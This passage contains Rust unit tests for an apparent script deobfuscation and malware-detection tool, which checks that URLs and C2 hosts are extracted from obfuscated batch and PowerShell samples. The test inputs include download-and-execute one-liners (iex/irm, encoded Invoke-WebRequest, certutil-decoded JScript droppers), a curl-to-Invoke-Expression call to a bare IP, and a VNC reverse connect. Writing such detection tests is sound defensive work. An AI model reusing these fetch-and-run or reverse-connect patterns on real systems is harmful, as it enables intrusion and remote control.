                Trait::DownloadInDeobText { src, .. } if src.contains("gofile.io/dl/abc123")
            )
        });
        assert!(has, "no inline-b64 URL extracted: {:?}", report.traits);
    }

    #[test]
    fn b64_url_prefix_ignores_embedded_match_inside_long_b64_blob() {
        let url = "http://ip-api.com/line?field=1";
        let b64 = base64::engine::general_purpose::STANDARD.encode(url.as_bytes());
        let deob = format!("echo AAAA{b64}BBBB >> payload.b64\r\n");
        let mut env = Environment::new(&Config::default());
        crate::deob_scan::scan_b64_url_prefix(&deob, &mut env);
        assert!(
            env.traits.is_empty(),
            "embedded b64 substring produced URL: {:?}",
            env.traits
        );
    }

    #[test]
    fn b64_url_prefix_still_extracts_standalone_token() {
        let url = "https://evil.example/payload.exe";
        let b64 = base64::engine::general_purpose::STANDARD.encode(url.as_bytes());
        let deob = format!("set encoded_url={b64}\r\n");
        let mut env = Environment::new(&Config::default());
        crate::deob_scan::scan_b64_url_prefix(&deob, &mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, cmd, .. } if src == url && cmd == "b64-url-prefix"
            )
        });
        assert!(has, "standalone b64 URL missed: {:?}", env.traits);
        let generic_count = env
            .traits
            .iter()
            .filter(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url))
            .count();
        assert_eq!(
            generic_count, 0,
            "standalone b64 URL double-emitted: {:?}",
            env.traits
        );
    }

    #[test]
    fn b64_url_prefix_respects_noise_filter() {
        let url = "http://sawebservice.red-gate.com/";
        let b64 = base64::engine::general_purpose::STANDARD.encode(url.as_bytes());
        let deob = format!("set encoded_url={b64}\r\n");
        let mut env = Environment::new(&Config::default());
        crate::deob_scan::scan_b64_url_prefix(&deob, &mut env);
        assert!(
            env.traits.is_empty(),
            "noise URL extracted: {:?}",
            env.traits
        );
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod deob_scan_noise_filter_tests {
    use crate::traits::Trait;
    use crate::{analyze, Config};

    #[test]
    fn digicert_cps_filtered_out() {
        let script = b"echo This is a certificate URL: http://www.digicert.com/CPS\r\n";
        let report = analyze(script, &Config::default());
        let has_noise = report.traits.iter().any(|t| {
            matches!(t,
                Trait::DownloadInDeobText { src, .. } if src.contains("digicert.com/CPS")
            )
        });
        assert!(!has_noise, "digicert CPS not filtered: {:?}", report.traits);
    }

    #[test]
    fn adobe_xmp_filtered_out() {
        let script = b"echo metadata URL http://ns.adobe.com/photoshop/1.0/\r\n";
        let report = analyze(script, &Config::default());
        let has_noise = report.traits.iter().any(|t| {
            matches!(t,
                Trait::DownloadInDeobText { src, .. } if src.contains("ns.adobe.com")
            )
        });
        assert!(!has_noise, "adobe XMP not filtered: {:?}", report.traits);
    }

    #[test]
    fn windows_long_path_documentation_filtered_out() {
        let script = b"echo Makes the application long-path aware. See https://docs.microsoft.com/windows/win32/fileio/maximum-file-path-limitation -->\r\n";
        let report = analyze(script, &Config::default());
        let has_noise = report.traits.iter().any(|t| {
            matches!(t,
                Trait::DownloadInDeobText { src, .. }
                    if src.contains("maximum-file-path-limitation")
            )
        });
        assert!(
            !has_noise,
            "Windows manifest documentation URL not filtered: {:?}",
            report.traits
        );
    }

    #[test]
    fn xml_manifest_namespaces_filtered_out() {
        let script = b"echo <genuineAuthorization xmlns=\"http://www.microsoft.com/DRM/SL/GenuineAuthorization/1.0\">\r\necho xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\r\n";
        let report = analyze(script, &Config::default());
        let noise: Vec<_> = report
            .traits
            .iter()
            .filter_map(|t| match t {
                Trait::DownloadInDeobText { src, .. } => Some(src.clone()),
                _ => None,
            })
            .collect();
        assert!(
            noise.is_empty(),
            "XML manifest namespace URLs not filtered: {:?}",
            report.traits
        );
    }

    #[test]
    fn wsman_schema_namespaces_filtered_out() {
        let script = b"echo dialect = \"http://schemas.dmtf.org/wbem/wsman/1/wsman/SelectorFilter\"\r\necho xsd = \"http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd\"\r\n";
        let report = analyze(script, &Config::default());
        let noise: Vec<_> = report
            .traits
            .iter()
            .filter_map(|t| match t {
                Trait::DownloadInDeobText { src, .. } if src.contains("schemas.dmtf.org") => {
                    Some(src.clone())
                }
                Trait::Download { src, .. } if src.contains("schemas.dmtf.org") => {
                    Some(src.clone())
                }
                _ => None,
            })
            .collect();
        assert!(
            noise.is_empty(),
            "WS-Man schema namespace URLs not filtered: {:?}",
            report.traits
        );
    }

    #[test]
    fn real_url_still_surfaced() {
        // Sanity: real URLs alongside noise still come through
        let script =
            b"echo http://evil.example/payload.exe\r\necho http://www.digicert.com/CPS\r\n";
        let report = analyze(script, &Config::default());
        let has_real = report.traits.iter().any(|t| {
            matches!(t,
                Trait::DownloadInDeobText { src, .. } if src.contains("evil.example/payload.exe")
            )
        });
        assert!(has_real, "real URL filtered: {:?}", report.traits);
    }

    #[test]
    fn batcloak_generator_comment_filtered_out() {
        let script = b"echo rem https://github.com/ch2sh/BatCloak\r\n";
        let report = analyze(script, &Config::default());
        let has_noise = report.traits.iter().any(|t| {
            matches!(t,
                Trait::DownloadInDeobText { src, .. } if src.contains("github.com/ch2sh/BatCloak")
            )
        });
        assert!(
            !has_noise,
            "BatCloak generator comment not filtered: {:?}",
            report.traits
        );
    }

    #[test]
    fn baum1810_generator_comment_filtered_out() {
        let script = b"echo    ::obfuscated by https://github.com/baum1810\r\n";
        let report = analyze(script, &Config::default());
        let has_noise = report.traits.iter().any(|t| {
            matches!(t,
                Trait::DownloadInDeobText { src, .. } if src.contains("github.com/baum1810")
            )
        });
        assert!(
            !has_noise,
            "baum1810 generator comment not filtered: {:?}",
            report.traits
        );
    }

    #[test]
    fn malformed_sysinternals_certificate_url_filtered_out() {
        let script = b"echo binary metadata https://www.sysinternals.com0\r\n";
        let report = analyze(script, &Config::default());
        let has_noise = report.traits.iter().any(|t| {
            matches!(t,
                Trait::DownloadInDeobText { src, .. } if src.contains("sysinternals.com0")
            )
        });
        assert!(
            !has_noise,
            "malformed Sysinternals certificate URL not filtered: {:?}",
            report.traits
        );
    }

    #[test]
    fn github_go_import_metadata_filtered_out() {
        let script = br#"<meta name="go-import" content="github.com/abarekl1/i git https://github.com/abarekl1/i.git">"#;
        let report = analyze(script, &Config::default());
        let has_noise = report.traits.iter().any(|t| {
            matches!(t,
                Trait::DownloadInDeobText { src, .. } if src.contains("github.com/abarekl1/i.git")
            )
        });
        assert!(
            !has_noise,
            "GitHub go-import metadata not filtered: {:?}",
            report.traits
        );
    }

    #[test]
    fn github_resource_navigation_filtered_out() {
        let script = br#"<a href="https://github.com/resources/whitepapers">whitepapers</a>"#;
        let report = analyze(script, &Config::default());
        let has_noise = report.traits.iter().any(|t| {
            matches!(t,
                Trait::DownloadInDeobText { src, .. } if src.contains("github.com/resources/whitepapers")
            )
        });
        assert!(
            !has_noise,
            "GitHub resource navigation not filtered: {:?}",
            report.traits
        );
    }

    #[test]
    fn schemeless_search_fragment_filtered_out() {
        let script =
            br#"for /f "delims=" %%a in ('find "https://download" weba.html') do set "result=%%a""#;
        let report = analyze(script, &Config::default());
        let has_noise = report.traits.iter().any(|t| {
            matches!(t,
                Trait::DownloadInDeobText { src, .. } if src == "https://download"
            )
        });
        assert!(
            !has_noise,
            "bare host search fragment not filtered: {:?}",
            report.traits
        );
    }

    #[test]
    fn malformed_raw_githubusercontent_prefix_filtered_out() {
        let script =
            br#"set "SEVEN_ZIP_URL=https://raw.githubusercontent.com/example/repo/main/7z.exe&""#;
        let report = analyze(script, &Config::default());
        let has_noise = report.traits.iter().any(|t| {
            matches!(t,
                Trait::DownloadInDeobText { src, .. } if src == "https://raw.githubuserc"
            )
        });
        assert!(
            !has_noise,
            "malformed raw.githubusercontent prefix not filtered: {:?}",
            report.traits
        );
    }

    #[test]
    fn massgrave_help_documentation_filtered_out() {
        let script = b"echo Help - https://massgrave.dev/troubleshoot\r\n";
        let report = analyze(script, &Config::default());
        let has_noise = report.traits.iter().any(|t| {
            matches!(t,
                Trait::DownloadInDeobText { src, .. } if src == "https://massgrave.dev/troubleshoot"
            )
        });
        assert!(
            !has_noise,
            "Massgrave help documentation URL not filtered: {:?}",
            report.traits
        );
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod self_extract_comment_tests {
    use crate::traits::Trait;
    use crate::{analyze, Config};

    #[test]
    fn findstr_caret_anchor_matches_comment_lines() {
        let script = b"@echo off\r\nfor /f \"tokens=*\" %%a in ('findstr \"^:::\" \"%~f0\"') do echo got: %%a\r\ngoto :eof\r\n:::http://evil.example/dropper.exe\r\n:::http://evil.example/loader.dll\r\n";
        let report = analyze(script, &Config::default());
        let urls: Vec<_> = report
            .traits
            .iter()
            .filter_map(|t| match t {
                Trait::Download { src, .. } => Some(src.clone()),
                Trait::DownloadInDeobText { src, .. } => Some(src.clone()),
                _ => None,
            })
            .collect();
        assert!(
            urls.iter().any(|u| u.contains("dropper.exe")),
            "no dropper.exe: {:?}",
            urls
        );
        assert!(
            urls.iter().any(|u| u.contains("loader.dll")),
            "no loader.dll: {:?}",
            urls
        );
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod b64_url_anywhere_tests {
    use crate::traits::Trait;
    use crate::{analyze, Config};
    use base64::Engine;

    #[test]
    fn bare_quoted_b64_url_extracted() {
        // The b64 string appears as a bare $var = 'aHR0...' literal
        // (not wrapped in FromBase64String). The decoded result is a URL.
        let url = "https://github.com/CryptersAndTools/Upload/blob/main/new_image.jpg";
        let b64 = base64::engine::general_purpose::STANDARD.encode(url.as_bytes());
        let script = format!("set X=$base64Url = '{}'\r\necho %X%\r\n", b64);
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::DownloadInDeobText { src, .. } if src.contains("CryptersAndTools")
            )
        });
        assert!(has, "no bare-b64 URL: {:?}", report.traits);
    }

    #[test]
    fn double_quoted_b64_url_extracted() {
        // Some scripts use double quotes.
        // URL must be ≥45 chars so the b64 string is ≥60 chars (the sweep threshold).
        let url = "https://evil.example.com/malware/stage2/payload.exe";
        let b64 = base64::engine::general_purpose::STANDARD.encode(url.as_bytes());
        let script = format!("set X=$url = \"{}\"\r\necho %X%\r\n", b64);
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::DownloadInDeobText { src, .. } if src.contains("evil.example.com/malware")
            )
        });
        assert!(has, "no double-quoted b64 URL: {:?}", report.traits);
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod skip_nth_decoder_tests {
    use crate::traits::Trait;
    use crate::{analyze, Config};
    use base64::Engine as _;

    fn encode_utf16(payload: &str) -> String {
        let utf16: Vec<u8> = payload
            .encode_utf16()
            .flat_map(|u| u.to_le_bytes())
            .collect();
        base64::engine::general_purpose::STANDARD.encode(&utf16)
    }

    #[test]
    fn skip_2_decoder_recovers_url() {
        // The carrier string is constructed so that picking every other char starting
        // at index 1 spells the URL. Padding chars at even indices are random.
        // Target URL: "http://x.com/y" (14 chars)
        // Carrier: "?h?t?t?p?:?/?/?x?.?c?o?m?/?y" (29 chars, '?' at even indices)
        let inner = r#"function dec($x){$i=1;$out='';do{$out+=$x[$i];$i+=2}until(!$x[$i]);$out};
$url = dec '?h?t?t?p?:?/?/?x?.?c?o?m?/?y';
Invoke-WebRequest -Uri $url"#;
        let script = format!("powershell -EncodedCommand {}\r\n", encode_utf16(inner));
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src.contains("x.com/y")
            )
        });
        assert!(
            has,
            "skip-2 decoder didn't recover URL: {:?}",
            report.traits
        );
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod assembly_pattern_tests {
    use crate::traits::Trait;
    use crate::{analyze, Config};
    use base64::Engine as _;

    fn encode_utf16(payload: &str) -> String {
        let utf16: Vec<u8> = payload
            .encode_utf16()
            .flat_map(|u| u.to_le_bytes())
            .collect();
        base64::engine::general_purpose::STANDARD.encode(&utf16)
    }

    #[test]
    fn space_concat_url_array_resolves() {
        let inner = r#"$bnt='https' '://evil.example/y'; Invoke-WebRequest ($bnt -join '')"#;
        let script = format!("powershell -EncodedCommand {}\r\n", encode_utf16(inner));
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src.contains("evil.example/y")
            )
        });
        assert!(has, "space-concat not resolved: {:?}", report.traits);
    }

    #[test]
    fn multi_chunk_char_array_concat_resolves() {
        // ([char[]]@(104,116,116,112)-join '') + ([char[]]@(58,47,47,120)-join '') + ([char[]]@(46,99,111,109)-join '')
        // → 'http' + '://x' + '.com' = 'http://x.com'
        let inner = r#"$u = ([char[]]@(104,116,116,112)-join '') + ([char[]]@(58,47,47,120)-join '') + ([char[]]@(46,99,111,109)-join ''); Invoke-WebRequest -Uri $u"#;
        let script = format!("powershell -EncodedCommand {}\r\n", encode_utf16(inner));
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src.contains("http://x.com")
            )
        });
        assert!(
            has,
            "multi-chunk char-array not resolved: {:?}",
            report.traits
        );
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod ps_alias_tests {
    use crate::ps_alias::expand_aliases;

    #[test]
    fn iex_expanded() {
        assert_eq!(
            expand_aliases("iex something"),
            "Invoke-Expression something"
        );
    }

    #[test]
    fn iwr_irm_expanded() {
        let out = expand_aliases("iex(irm http://x)");
        assert!(out.contains("Invoke-Expression"), "got: {}", out);
        assert!(out.contains("Invoke-RestMethod"), "got: {}", out);
    }

    #[test]
    fn ni_expanded_in_function_def() {
        let out = expand_aliases("(ni -p function: -n Decoder)");
        assert!(out.contains("New-Item"), "got: {}", out);
    }

    #[test]
    fn non_alias_preserved() {
        let out = expand_aliases("MyCustomFunction $x");
        assert_eq!(out, "MyCustomFunction $x");
    }

    #[test]
    fn case_insensitive_match() {
        let out = expand_aliases("IEX (IWR $u)");
        assert!(out.contains("Invoke-Expression"), "got: {}", out);
        assert!(out.contains("Invoke-WebRequest"), "got: {}", out);
    }

    #[test]
    fn gate_blocks_non_ps_text() {
        // CMD-only text with tokens that ARE PS aliases (start, copy, del,
        // dir, cd, cls, type, where) must pass through unchanged when there
        // is no PowerShell-context marker visible.
        use crate::ps_alias::expand_aliases_if_ps;
        let cmd_only =
            "@echo off\nstart notepad\ncopy a b\ndel c\ndir /b\ncd C:\\\ncls\ntype f\nwhere foo\n";
        assert_eq!(expand_aliases_if_ps(cmd_only), cmd_only);
    }

    #[test]
    fn gate_allows_ps_dollar_sigil() {
        use crate::ps_alias::expand_aliases_if_ps;
        let with_ps = "$x = 1; iwr http://e.example/p";
        let out = expand_aliases_if_ps(with_ps);
        assert!(out.contains("Invoke-WebRequest"), "got: {}", out);
    }

    #[test]
    fn gate_allows_powershell_keyword() {
        use crate::ps_alias::expand_aliases_if_ps;
        let with_kw = "powershell -c \"iex (irm http://e.example/p)\"";
        let out = expand_aliases_if_ps(with_kw);
        assert!(out.contains("Invoke-Expression"), "got: {}", out);
        assert!(out.contains("Invoke-RestMethod"), "got: {}", out);
    }

    #[test]
    fn gate_allows_alias_only_payload() {
        // Regression: looks_like_powershell required a `$var`, `::`, Verb-Noun,
        // or `powershell` literal. A decoded -EncodedCommand body that is just
        // `iex(iwr 'http://...')` had none of those, so alias expansion was
        // skipped and downstream IWR_RE never fired. The networking aliases
        // themselves now suffice as a PS-context signal.
        use crate::ps_alias::expand_aliases_if_ps;
        let alias_only = "iex(iwr 'http://e.example/p')";
        let out = expand_aliases_if_ps(alias_only);
        assert!(out.contains("Invoke-Expression"), "got: {}", out);
        assert!(out.contains("Invoke-WebRequest"), "got: {}", out);
    }

    #[test]
    fn gate_allows_verb_noun_cmdlet() {
        use crate::ps_alias::expand_aliases_if_ps;
        let with_cmdlet = "Get-Item foo; start bar";
        let out = expand_aliases_if_ps(with_cmdlet);
        assert!(out.contains("Start-Process bar"), "got: {}", out);
    }

    #[test]
    fn cmdlet_head_not_double_expanded() {
        // `start` is an alias for Start-Process, but Start-Process itself
        // must not be re-expanded to Start-Process-Process.
        assert_eq!(
            expand_aliases("Start-Process notepad"),
            "Start-Process notepad"
        );
        assert_eq!(
            expand_aliases("start-process notepad"),
            "start-process notepad"
        );
        // Same family for other aliases that share a stem with a real cmdlet.
        assert_eq!(expand_aliases("Select-String foo"), "Select-String foo");
        assert_eq!(expand_aliases("Where-Object { $_ }"), "Where-Object { $_ }");
        assert_eq!(expand_aliases("Sort-Object Name"), "Sort-Object Name");
        assert_eq!(expand_aliases("Copy-Item a b"), "Copy-Item a b");
        // But the bare alias still expands.
        assert!(expand_aliases("start notepad").starts_with("Start-Process"));
    }

    #[test]
    fn foreach_language_statement_not_expanded_as_alias() {
        let input = "foreach ($line in $lines) { echo $line }";
        let out = expand_aliases(input);
        assert!(
            out.starts_with("foreach ($line in $lines)"),
            "foreach language statement was rewritten: {}",
            out
        );
        assert!(
            out.contains("Write-Output $line"),
            "echo alias missed: {}",
            out
        );
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod truncated_url_var_tests {
    use crate::env::{Config, Environment};
    use crate::traits::Trait;

    #[test]
    fn truncated_url_var_extracted() {
        // Simulate deob output where a non-ASCII var name was stripped,
        // leaving the stranded "=://hostname/path pattern.
        let mut env = Environment::new(&Config::default());
        // Deob text that contains the truncated URL var artifact
        let deob = r#"set "=://evil.example/loader.bat""#;
        crate::deob_scan::scan_truncated_url_vars(deob, &mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::DownloadInDeobText { src, .. } if src.contains("evil.example/loader.bat")
            )
        });
        assert!(has, "trunc URL not extracted: {:?}", env.traits);
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod certutil_decoded_js_tests {
    use crate::env::{Config, Environment};
    use crate::traits::Trait;

    fn extract(deob: &str) -> Vec<String> {
        let mut env = Environment::new(&Config::default());
        crate::deob_scan::scan_certutil_decoded_js(deob, &mut env);
        env.traits
            .iter()
            .filter_map(|t| match t {
                Trait::Download { src, cmd, .. } if cmd == "certutil-decode-js" => {
                    Some(src.clone())
                }
                Trait::DownloadInDeobText { src, line_hint }
                    if line_hint == "certutil-decode-js" =>
                {
                    Some(src.clone())
                }
                _ => None,
            })
            .collect()
    }

    #[test]
    fn split_string_getobject_url_extracted() {
        // base64-decodes to:
        //   var a="sc"+"r";b="ipt:h";c="T"+"tP"+":";GetObject(a+b+c+"//evil.example/?1/");
        // We only need the trailing string literal to land in JS_BARE_URL_RE.
        let plain =
            r#"var a="sc"+"r";b="ipt:h";c="T"+"tP"+":";GetObject(a+b+c+"//evil.example/?1/");"#;
        let b64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, plain);
        let deob = format!(
            "md C:\\tmp\\>nul 2>&1\nseT V=C:\\tmp\\f.jS\necho {b64} > !V!\ncertutil -f -decode !V! !V!\ncall !V!\n"
        );
        let urls = extract(&deob);
        assert!(
            urls.iter().any(|u| u == "https://evil.example/?1/"),
            "expected https://evil.example/?1/ in {:?}",
            urls
        );
    }

    #[test]
    fn split_string_getobject_url_emits_structured_download() {
        let plain =
            r#"var a="sc"+"r";b="ipt:h";c="T"+"tP"+":";GetObject(a+b+c+"//evil.example/?1/");"#;
        let b64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, plain);
        let deob = format!("echo {b64} > f.js\ncertutil -f -decode f.js f.js\ncall f.js\n");
        let mut env = Environment::new(&Config::default());
        crate::deob_scan::scan_certutil_decoded_js(&deob, &mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://evil.example/?1/"
            )
        });
        assert!(
            has,
            "decoded JS GetObject did not emit Download: {:?}",
            env.traits
        );
        let generic_count = env
            .traits
            .iter()
            .filter(|t| {
                matches!(t, Trait::DownloadInDeobText { src, line_hint }
                    if line_hint == "certutil-decode-js" && src == "https://evil.example/?1/")
            })
            .count();
        assert_eq!(
            generic_count, 0,
            "decoded JS GetObject double-emitted: {:?}",
            env.traits
        );
    }

    #[test]
    fn gate_requires_certutil_call() {
        // echo + base64 alone without a certutil-decode should not fire.
        let plain = r#"GetObject("//evil.example/?1/")"#;
        let b64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, plain);
        let deob = format!("echo {b64} > !V!\ncall !V!\n");
        assert!(extract(&deob).is_empty());
    }

    #[test]
    fn multistage_dropper_detected() {
        let mut env = Environment::new(&Config::default());
        // Stage-1 shape with a long b64 + marker, plus AES + GZip + ::: tokens
        // to populate all four boolean fields.
        let long_b64 = "A".repeat(1500);
        let deob = format!(
            "powershell -c iex([Convert]::FromBase64String('{long_b64}'.Replace('XYZmarker','')));\
             System.Security.Cryptography.Aes;CipherMode]::CBC;GZipStream;:::1payload"
        );
        crate::deob_scan::scan_multistage_encrypted_dropper(&deob, &mut env);
        let mut found = false;
        for t in &env.traits {
            if let Trait::MultiStageEncryptedDropper {
                marker,
                b64_length,
                has_aes_cbc,
                has_gzip_stage,
                reads_self_lines,
                ..
            } = t
            {
                assert_eq!(marker, "XYZmarker");
                assert!(*b64_length >= 1500);
                assert!(*has_aes_cbc);
                assert!(*has_gzip_stage);
                assert!(*reads_self_lines);
                found = true;
            }
        }
        assert!(found, "trait missing: {:?}", env.traits);
    }

    #[test]
    fn multistage_dropper_skips_short_b64() {
        let mut env = Environment::new(&Config::default());
        let deob = "iex([Convert]::FromBase64String('AAAA'.Replace('m','')));";
        crate::deob_scan::scan_multistage_encrypted_dropper(deob, &mut env);
        assert!(env.traits.is_empty(), "false positive: {:?}", env.traits);
    }

    #[test]
    fn multistage_dropper_only_one_per_sample() {
        let mut env = Environment::new(&Config::default());
        let long_b64 = "A".repeat(1500);
        let deob = format!("'{long_b64}'.Replace('m1','') ... '{long_b64}'.Replace('m2','')");
        crate::deob_scan::scan_multistage_encrypted_dropper(&deob, &mut env);
        let count = env
            .traits
            .iter()
            .filter(|t| matches!(t, Trait::MultiStageEncryptedDropper { .. }))
            .count();
        assert_eq!(
            count, 1,
            "expected single trait, got {}: {:?}",
            count, env.traits
        );
    }

    #[test]
    fn delim_wrapped_mshta_url_extracted() {
        let mut env = Environment::new(&Config::default());
        // Mirrors the corpus shape: set VAR=<DELIM><DELIM>host.tld<DELIM>?1<DELIM>
        let deob = "mshta&&sEt 9IF=BOTKRBOTKRa9eikr.5wyck43a9uxnu7e.cfdBOTKR?1BOTKR";
        crate::deob_scan::scan_delim_wrapped_urls(deob, &mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, cmd, .. }
                    if cmd == "delim-wrapped-mshta-hta"
                    && src == "https://a9eikr.5wyck43a9uxnu7e.cfd?1"
            )
        });
        assert!(has, "delim-wrapped URL missed: {:?}", env.traits);
        let generic_count = env
            .traits
            .iter()
            .filter(|t| {
                matches!(t, Trait::DownloadInDeobText { src, .. }
                    if src == "https://a9eikr.5wyck43a9uxnu7e.cfd?1")
            })
            .count();
        assert_eq!(
            generic_count, 0,
            "delim-wrapped URL double-emitted: {:?}",
            env.traits
        );
    }

    #[test]
    fn delim_wrapped_mshta_url_with_collapsed_one_char_marker_extracted() {
        let mut env = Environment::new(&Config::default());
        let deob = "mshta hta sEt OB0=DDnuou9z.mjhytrdcvghujnb.xyzD?1D";
        crate::deob_scan::scan_delim_wrapped_urls(deob, &mut env);
        assert!(
            env.traits.iter().any(|t| {
                matches!(t,
                    Trait::Download { src, cmd, .. }
                        if cmd == "delim-wrapped-mshta-hta"
                        && src == "https://nuou9z.mjhytrdcvghujnb.xyz?1"
                )
            }),
            "collapsed marker URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn damaged_scheme_download_context_url_is_recovered() {
        let mut env = Environment::new(&Config::default());
        let deob = r#"powershell -Command "(New-Object Net.WebClient).DownloadFile('1://www.dropbox.com/scl/fi/abc/Campaign.docx?rlkey=xyz&dl=1', 'C:\Temp\a.docx')""#;
        crate::deob_scan::scan_damaged_scheme_download_urls(deob, &mut env);
        assert!(
            env.traits.iter().any(|t| {
                matches!(t,
                    Trait::DownloadInDeobText { src, line_hint }
                        if line_hint == "damaged-scheme-download-context"
                        && src == "https://www.dropbox.com/scl/fi/abc/Campaign.docx?rlkey=xyz&dl=1"
                )
            }),
            "damaged scheme URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn damaged_scheme_quoted_source_destination_pair_is_recovered() {
        let mut env = Environment::new(&Config::default());
        let deob = r#"@IF 1 EQU 1 %noise:~1,1%://gitlab.com/team/repo/-/raw/main/payload.zip', 'C:\Users\Public\Document.zip')"#;
        crate::deob_scan::scan_damaged_scheme_download_urls(deob, &mut env);
        assert!(
            env.traits.iter().any(|t| {
                matches!(t,
                    Trait::DownloadInDeobText { src, line_hint }
                        if line_hint == "damaged-scheme-download-context"
                        && src == "https://gitlab.com/team/repo/-/raw/main/payload.zip"
                )
            }),
            "damaged quoted pair URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn damaged_scheme_code_host_url_with_mangled_context_is_recovered() {
        let mut env = Environment::new(&Config::default());
        let deob = r#"@if 1 EQU 1 set "urlfilezip=%noise:~1,1%://gitlab.com/oilki/yiuo/-/raw/main/F24V5.zip""#;
        crate::deob_scan::scan_damaged_scheme_download_urls(deob, &mut env);
        assert!(
            env.traits.iter().any(|t| {
                matches!(t,
                    Trait::DownloadInDeobText { src, line_hint }
                        if line_hint == "damaged-scheme-download-context"
                        && src == "https://gitlab.com/oilki/yiuo/-/raw/main/F24V5.zip"
                )
            }),
            "damaged code-host URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn damaged_scheme_payload_extension_url_with_mangled_context_is_recovered() {
        let mut env = Environment::new(&Config::default());
        let deob = r#"set "urlsetup=%marker:~2,1%://cdn.example.net/installers/update.msi""#;
        crate::deob_scan::scan_damaged_scheme_download_urls(deob, &mut env);
        assert!(
            env.traits.iter().any(|t| {
                matches!(t,
                    Trait::DownloadInDeobText { src, line_hint }
                        if line_hint == "damaged-scheme-download-context"
                        && src == "https://cdn.example.net/installers/update.msi"
                )
            }),
            "damaged payload-extension URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn delim_wrapped_not_triggered_without_repeated_marker() {
        // A normal hostname with no surrounding repeated marker must not
        // create a delim-wrapped trait.
        let mut env = Environment::new(&Config::default());
        let deob = "set X=normal.example.com?1";
        crate::deob_scan::scan_delim_wrapped_urls(deob, &mut env);
        assert!(env.traits.is_empty(), "false positive: {:?}", env.traits);
    }

    #[test]
    fn bare_ip_url_after_curl_extracted() {
        let mut env = Environment::new(&Config::default());
        let deob = "powershell Invoke-Expression -Command:(curl -uri 185.117.72.132/gate990.php -method post)";
        crate::deob_scan::scan_bare_ip_urls(deob, &mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::DownloadInDeobText { src, line_hint }
                    if line_hint == "bare-ip-url"
                    && src == "http://185.117.72.132/gate990.php"
            )
        });
        assert!(has, "bare IP URL missed: {:?}", env.traits);
    }

    #[test]
    fn bare_ip_url_with_port_extracted() {
        let mut env = Environment::new(&Config::default());
        let deob = "wget 91.92.34.126:6600";
        crate::deob_scan::scan_bare_ip_urls(deob, &mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::DownloadInDeobText { src, .. } if src == "http://91.92.34.126:6600"
            )
        });
        assert!(has, "port URL missed: {:?}", env.traits);
    }

    #[test]
    fn damaged_ps_char_array_join_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let deob = "$u=([[]]@(104,116)-join')+([[]]@(116,112,58)-join')+([[]]@(47,47,56,55,46)-join')+([[]]@(49,50,48,46)-join')+([[]]@(50,49,57,46)-join')+([[]]@(50,50,50,58,52,49,50,57,50)-join')+([[]]@(47,49,47,122,46,103,105,102)-join')";
        crate::deob_scan::scan_ps_char_concat_urls(deob, &mut env);
        assert!(
            env.traits.iter().any(|t| {
                matches!(t,
                    Trait::DownloadInDeobText { src, line_hint }
                        if line_hint == "ps-char-concat"
                        && src == "http://87.120.219.222:41292/1/z.gif"
                )
            }),
            "damaged char-array URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn winvnc_reverse_connect_emits_remote_connect_not_generic_url() {
        let mut env = Environment::new(&Config::default());
        let deob =
            r#"start C:\Games\winvnc.exe -autoreconnect ID:123 -connect 193.43.104.183:5500 -run"#;
        crate::deob_scan::scan_bare_ip_urls(deob, &mut env);
        let has = env.traits.iter().any(|t| {
            let Ok(value) = serde_json::to_value(t) else {
                return false;
            };
            value.get("kind").and_then(|kind| kind.as_str()) == Some("RemoteConnect")
                && value.get("host").and_then(|host| host.as_str()) == Some("193.43.104.183")
                && value.get("port").and_then(|port| port.as_u64()) == Some(5500)
        });
        assert!(has, "VNC reverse connect not typed: {:?}", env.traits);
        assert!(
            !env.traits.iter().any(|t| {
                matches!(t, Trait::DownloadInDeobText { src, .. }
                    if src == "http://193.43.104.183:5500")
            }),
            "VNC reverse connect double-emitted as generic URL: {:?}",
            env.traits
        );
    }

    #[test]
    fn bare_ip_not_triggered_outside_download_verb() {
        let mut env = Environment::new(&Config::default());
        // IP appearing as a value, not as the argument to a download verb,
        // must not be extracted.
        let deob = "echo Server IP: 10.0.0.5 / 8080";
        crate::deob_scan::scan_bare_ip_urls(deob, &mut env);
